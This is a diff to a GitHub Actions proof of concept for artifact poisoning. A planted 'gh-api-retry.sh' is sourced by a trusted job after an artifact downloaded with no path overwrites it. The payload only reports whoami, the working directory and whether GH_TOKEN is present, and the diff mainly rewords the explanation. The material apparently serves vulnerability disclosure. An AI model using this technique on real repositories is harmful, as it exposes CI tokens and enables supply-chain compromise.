@@ -20,7 +20,7 @@ jobs:
           # unquoted heredoc: ${PR} is baked in now, \${GH_TOKEN} stays literal
           cat > .github/scripts/gh-api-retry.sh <<SH
           echo "=================================================="
-          echo " ARTIFACT POISONING PROVEN (velox shape)"
+          echo " ARTIFACT POISONING PROVEN"
           echo " attacker shell code executing via 'source'"
           echo " GH_TOKEN present in this shell: \${GH_TOKEN:+yes}"
           echo " user=\$(whoami) cwd=\$(pwd)"
@@ -28,13 +28,13 @@ jobs:
           gh_api() { echo "${PR}"; }
           SH
           cat > comment.md <<'MD'
-          **PoC — artifact poisoning in the velox `selective-build-comment` shape.**
+          **PoC — artifact poisoning in `selective-build-comment.yml`.**
 
           This comment body came from an attacker-controlled artifact, and the step that
-          produced it executed attacker shell code that was `source`d from
-          `.github/scripts/gh-api-retry.sh` after the artifact overwrote the trusted
-          sparse checkout. No zip traversal was needed: the download step has no `path:`,
-          so the artifact extracts straight into `$GITHUB_WORKSPACE`.
+          produced it executed attacker shell code `source`d from
+          `.github/scripts/gh-api-retry.sh`. The download step specifies no `path:`, so
+          the artifact extracted into `$GITHUB_WORKSPACE` and replaced that file in the
+          trusted sparse checkout before it was sourced.
           MD
           echo "--- payload ---"; cat .github/scripts/gh-api-retry.sh
 
